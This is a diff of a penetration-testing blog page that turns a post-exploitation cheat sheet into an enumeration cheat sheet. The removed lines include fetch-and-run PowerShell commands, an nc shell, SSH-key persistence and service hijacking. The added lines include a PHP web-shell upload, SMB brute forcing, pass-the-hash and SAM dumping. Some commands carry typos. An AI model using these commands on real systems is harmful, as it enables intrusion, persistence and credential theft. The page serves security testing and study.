@@ -14,24 +14,22 @@
   
     
     <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Post exploitation | Thekaiz3n</title>
+<title>Enumeration | Thekaiz3n</title>
 <meta name="generator" content="Jekyll v3.9.2" />
-<meta property="og:title" content="Post exploitation" />
+<meta property="og:title" content="Enumeration" />
 <meta name="author" content="Thekaiz3n" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="This is a guide for post exploitation" />
-<meta property="og:description" content="This is a guide for post exploitation" />
-<link rel="canonical" href="http://localhost:4000/guide/2022/01/13/post-exploitation.html" />
-<meta property="og:url" content="http://localhost:4000/guide/2022/01/13/post-exploitation.html" />
+<meta name="description" content="This is a guide for enumeration" />
+<meta property="og:description" content="This is a guide for enumeration" />
+<link rel="canonical" href="http://localhost:4000/cheatsheet/2022/01/13/enumeration.html" />
+<meta property="og:url" content="http://localhost:4000/cheatsheet/2022/01/13/enumeration.html" />
 <meta property="og:site_name" content="Thekaiz3n" />
-<meta property="og:image" content="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2022-01-13T00:00:00-03:00" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" />
-<meta property="twitter:title" content="Post exploitation" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Enumeration" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Thekaiz3n"},"dateModified":"2022-01-13T00:00:00-03:00","datePublished":"2022-01-13T00:00:00-03:00","description":"This is a guide for post exploitation","headline":"Post exploitation","image":"http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/guide/2022/01/13/post-exploitation.html"},"url":"http://localhost:4000/guide/2022/01/13/post-exploitation.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Thekaiz3n"},"dateModified":"2022-01-13T00:00:00-03:00","datePublished":"2022-01-13T00:00:00-03:00","description":"This is a guide for enumeration","headline":"Enumeration","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/cheatsheet/2022/01/13/enumeration.html"},"url":"http://localhost:4000/cheatsheet/2022/01/13/enumeration.html"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -55,7 +53,7 @@
 </head>
 
 
-  <body class="layout--post post-exploitation">
+  <body class="layout--post enumeration">
 
     <nav class="skip-links">
   <h2 class="screen-reader-text">Skip links</h2>
@@ -201,15 +199,10 @@
         <div class="initial-content">
           <header class="intro">
   
-    
-    <div class="intro-image">
-      <img src="/assets/images/cheatsheet/post-exploitation.jpeg" alt="Post exploitation">
-    </div>
-  
 
   <div class="inner">
     <div class="intro-text">
-      <h1 id="page-title" class="intro-title">Post exploitation
+      <h1 id="page-title" class="intro-title">Enumeration
 </h1>
       
 
@@ -234,116 +227,118 @@
   <div class="inner">
     <article class="entry-wrap">
       <div class="entry-content">
-        <h1 id="privilege-escalation">Privilege escalation</h1>
+        <h1 id="enumeration">Enumeration</h1>
 
-<h3 id="ssh">SSH</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-f</span> user <span class="c"># Attack</span>
+<h2 id="brute-force-directorypagesfiles">Brute force directory/pages/files</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> 172.16.1.10/ <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-s</span> <span class="s2">"200,301,302,401"</span> <span class="nb">.</span>
 
-<span class="c"># Victim</span>
-<span class="nb">mkdir</span>  <span class="o">(</span>home/<span class="o">)</span>~www-data/
-<span class="nb">mkdir</span> ~/.ssh/
-<span class="nb">touch</span> ~/.ssh/authorized_keys
-<span class="nb">echo</span> <span class="s2">"public_key"</span> <span class="o">&gt;</span> ~/.ssh/authorized_keys
-ssh www-data@172.0.0.1 <span class="nt">-p</span> 2222 <span class="nt">-i</span> user
+gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> http://172.16.1.10/turismo <span class="nt">-w</span> /usr/share/wordlists/dirb/small.txt <span class="nt">-x</span> .php,.txt,.sql,.bkp  <span class="c">#Search by extensions.</span>
+
+gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> 192.168.0.7 <span class="nt">-w</span> wordlist <span class="nt">-x</span> .php <span class="nt">-c</span> cookie <span class="c"># Pass cookie</span>
 </code></pre></div></div>
 
-<h2 id="windows">Windows</h2>
-<h3 id="automatized">Automatized</h3>
+<p>Another tools:</p>
 <ul>
-  <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat">winPEAS</a></li>
+  <li>Dirsearch</li>
+  <li>Dirb</li>
+  <li>Dirbusters</li>
 </ul>
 
-<h3 id="mandatory-level">Mandatory level</h3>
+<p>File extensions to search:
+    - Web :.pl,.cgi,.sh,.php,.jsp,.asp,.aspx,.js,.html,.nm
+    - Backups:.bkp,.bak,.sql
+    - Files:.pdf,.txt,.conf,.xml</p>
+
+<p>Robots.txt/sitemap.xml are importants file that contains directories that are not indexed.</p>
+
+<h2 id="methods-allowed">Methods allowed</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-X</span> OPTIONS http://172.16.1.10/ <span class="c"># Will show all methods</span>
+</code></pre></div></div>
+
+<p>Put method</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-X</span> PUT <span class="nt">-d</span> <span class="s2">"&lt;?php system(</span><span class="se">\$</span><span class="s2">_GET["</span>cmd<span class="s2">"]); ?&gt;"</span> http://172.16.1.10/webdav/shell.php
+</code></pre></div></div>
+
+<h2 id="ftp">FTP</h2>
+<p>Commons credentials:</p>
 <ul>
-  <li>whoami /groups</li>
+  <li>User:anonymous, pass:anonymous</li>
 </ul>
 
-<h3 id="services">Services</h3>
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="c"># List services</span><span class="w">
-</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">Sate</span><span class="p">,</span><span class="nx">PathName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Running"</span><span class="w"> </span><span class="c"># Running services</span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="c"># Informations about a service </span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="c"># Service configurations</span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"certutil -urlcache -f priv.exe"</span><span class="w"> </span><span class="c"># Change the path of the file</span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
-</span></code></pre></div></div>
-
-<h2 id="linux">Linux</h2>
-<h3 id="automatized-1">Automatized</h3>
+<h2 id="smb">SMB</h2>
+<p>Permit share directories and files. Port 139 -&gt; NetBIOS, port 445 -&gt; SMB over TCP
+Links:</p>
 <ul>
-  <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a></li>
-  <li><a href="https://gtfobins.github.io/">gtfobins</a></li>
-  <li><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">Hacktricks SMB</a></li>
 </ul>
 
-<h3 id="suidgetuid">SUID/GETUID</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt;/dev/null 
+<h3 id="windows">Windows</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtstat <span class="nt">-A</span> 172.16.1.4 <span class="c"># show name, group, etc...</span>
+
+net view <span class="se">\\</span>172.16.1.5 <span class="c"># Try to connect</span>
+
+net view <span class="se">\\</span>172.16.1.5 <span class="s2">""</span> u:<span class="s2">""</span> <span class="c"># Null session logon</span>
+
+net use h: <span class="se">\\</span>172.16.1.5<span class="se">\o</span>pt <span class="c"># Mount the folder in h:</span>
+
+nbtstat <span class="nt">-c</span> <span class="c"># Cache of all old connections</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Python brute force
+</span><span class="k">for</span> <span class="o">/</span><span class="n">f</span> <span class="o">%</span><span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="n">do</span> <span class="n">net</span> <span class="n">use</span> \\<span class="mf">172.16</span><span class="p">.</span><span class="mf">1.4</span> <span class="o">%</span><span class="n">i</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="n">john</span>
 </code></pre></div></div>
 
-<h3 id="permissions">Permissions</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span> <span class="c"># Programs that run as sudo</span>
+<h3 id="linux">Linux</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtscan <span class="nt">-r</span> 172.16.1.0/24 <span class="c"># Search in range</span>
 
-find / <span class="nt">-type</span> f <span class="nt">-perm</span> 777 2&gt;/dev/null <span class="c"># Files with permissions</span>
+smbclient  <span class="nt">-L</span> <span class="se">\\</span>172.16.1.5 <span class="nt">-N</span> <span class="c"># Connect in anonymous mode</span>
 
-<span class="nb">ls</span> /etc/cron.<span class="k">*</span> <span class="c"># Check all crontab folders</span>
+smbclient   //172.16.1.5/_DOCS <span class="nt">-N</span> <span class="c"># Connect in a directory</span>
 
-<span class="nb">uname</span> <span class="nt">-l</span> <span class="c"># Kernel and SO versions</span>
-<span class="nb">cat</span> /etc/issue
+smbclient  <span class="nt">-L</span> <span class="se">\\</span>172.16.1.5 <span class="nt">-N</span> —option<span class="o">=</span><span class="s1">'client min protocol=NT1'</span> <span class="c"># Sometimes can have a version incompatibility with older versions</span>
+
+crackmapexec smb 192.168.10.11 <span class="nt">-u</span> Administrator <span class="nt">-H</span> &lt;NTHASH&gt; <span class="nt">-x</span> <span class="nb">whoami</span> <span class="c">#Pass-the-Hash</span>
+crackmapexec smb 192.168.10.11 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">-x</span> <span class="nb">whoami</span> <span class="c">#Execute cmd</span>
+crackmapexec smb &lt;IP&gt; <span class="nt">-d</span> &lt;DOMAIN&gt; <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--sam</span> <span class="c">#Dump SAM</span>
+</code></pre></div></div>
+<p>Automatic enumeration : <a href="https://github.com/CiscoCXSecurity/enum4linux">enum4linux</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux <span class="nt">-U</span> 172.16.1.5 <span class="c"># Without users</span>
+
+enum4linux <span class="nt">-a</span> 172.16.1.5 <span class="c"># All</span>
+</code></pre></div></div>
+<h2 id="rpc-remote-proccedure-call">RPC Remote proccedure call</h2>
+<p>API to call commands in another machines.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 172.16.1.5 <span class="c"># Anonymous login</span>
+<span class="c"># After connect</span>
+enumdomusers <span class="c"># Enumerate users</span>
+queryuser jonh
+</code></pre></div></div>
+<h2 id="nfs-network-file-system">NFS Network file system</h2>
+<p>Protocol to share files. Port 2049</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcinfo <span class="nt">-p</span> 172.16.1.5 | <span class="nb">grep </span>nfs <span class="c"># Check versions</span>
+
+showmount <span class="nt">-e</span> 172.16.1.5 <span class="c"># Show shared</span>
+
+mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">nfsverscat</span><span class="o">=</span>2 172.16.1.5:/ /tmp/nfs <span class="c">#Mount the nfs</span>
 </code></pre></div></div>
 
-<h2 id="transfer-files">Transfer files</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer 80 <span class="c">#Open server</span>
-python3 <span class="nt">-m</span> http.server 80
+<h2 id="snmp-simple-network-management-protocol">SNMP Simple Network Management protocol</h2>
+<p>Protocol used to monitor different devices in the network (like routers, switches, printers, IoTs…). Ports: 161,162,10161,10162/UDP
+Links:</p>
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">Hacktricks snmp</a></li>
+  <li><a href="https://www.alvestrand.no/objectid/1.3.6.1.2">objectid list</a></li>
+</ul>
 
-<span class="c"># Windows</span>
-certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="o">[</span>http://172.20.1.6/file.exe]<span class="o">(</span>http://172.20.1.6/file.exe<span class="o">)</span> file.exe
-powershell.exe wget <span class="o">[</span>http://172.20.1.6/file.exe]<span class="o">(</span>http://172.20.1.6/file.exe<span class="o">)</span> <span class="nt">-OutFile</span> file.exe
-powershell.exe <span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://172.20.1.6/file.exe'</span>,<span class="s1">'file.exe'</span><span class="o">)</span>
-powershell.exe IEX<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://172.20.1.6/poc.txt'</span><span class="o">)</span> <span class="c"># Read and execute </span>
-<span class="c"># Windows hex</span>
-/usr/share/windows-resources/binaries/upx <span class="nt">-9</span> exec.exe <span class="c"># Compress</span>
-exe2hex <span class="nt">-x</span> exec.exe <span class="nt">-p</span> exec.txt <span class="c"># To hex</span>
-nc <span class="nt">-l</span> 10.10.10.10 4444 &lt; exec.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onesixtyone <span class="nt">-c</span> comu.txt 172.16.1.0/24 <span class="c"># Search by open hosts with communities</span>
 
-<span class="c"># Linux</span>
-wget http://172.20.1.6/file.exe <span class="nt">-O</span> /tm/file.exe
-curl http://172.20.1.6/file.exe <span class="nt">-o</span> file.exe
+snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> 172.16.1.4 1.3.6.1.4.1.77.1.2.25  <span class="c"># Search with public community and specific code</span>
 
-scp /source/folder/scp.zip root@191.162.0.2:/destiny/folder <span class="c">#ssh</span>
+snmp-check 172.16.1.4 <span class="nt">-c</span> public <span class="c"># Show info of host</span>
 </code></pre></div></div>
 
-<h2 id="tunneling">Tunneling</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Windows </span>
-nc.exe <span class="nt">-vnlp</span> 5555 <span class="nt">-s</span> 127.0.0.1 <span class="nt">-e</span> cmd.exe <span class="c"># Attacker</span>
-plink.exe <span class="nt">-ssh</span> <span class="nt">-l</span> user <span class="nt">-pw</span> root <span class="nt">-R</span> 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8 <span class="c"># Victim</span>
-nc <span class="nt">-v</span> 127.0.0.1 1337 <span class="c"># Attacker</span>
+<h2 id="waf-web-application-firewall">WAF Web application firewall</h2>
 
-<span class="c"># Linux</span>
-socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
-socat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22
-
-ssh www-data@172.0.0.1 <span class="nt">-p</span> 2222 <span class="nt">-i</span> us <span class="nt">-L</span> 3333:127.0.0.1:3306
-</code></pre></div></div>
-
-<h2 id="pivoting">Pivoting</h2>
-<p>Meterpreter</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig <span class="c"># Networks interface</span>
-route <span class="c"># Identify network</span>
-
-run autoroute <span class="nt">-s</span> 10.0.20.0/24 <span class="c">#Add a route to our machine</span>
-use auxiliary/server/sock4a <span class="c"># Create a proxy in port 1080</span>
-nano /ect/proxychains.conf <span class="c"># Add this proxy to proxychains</span>
-proxychains nmap <span class="nt">-v</span> —open <span class="nt">-sT</span> <span class="nt">-p</span> 110,139 <span class="nt">-Pn</span> 10.10.20.0/24 <span class="c"># The network is visible</span>
-V
-portfwd add <span class="nt">-l</span> 110 <span class="nt">-p</span> 110 <span class="nt">-r</span> 10.20.20.4 <span class="c"># Portfoward  a specific port</span>
-nmap <span class="nt">-sV</span> <span class="nt">-p</span> 110 127.0.0.10 <span class="c"># Can acess this port</span>
-</code></pre></div></div>
-
-<h2 id="internal-pentest">Internal pentest</h2>
-<h3 id="responder">Responder</h3>
-<p>A LLMNR &amp; NBT-NS Spoofing Attack.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /etc/responder/Responder.conf <span class="c"># Configure the ips field RespondTo</span>
-
-responder <span class="nt">-I</span> eth0 <span class="nt">-Prv</span> <span class="c"># Will list to all</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAFW00F google.com
 </code></pre></div></div>
 
       </div>
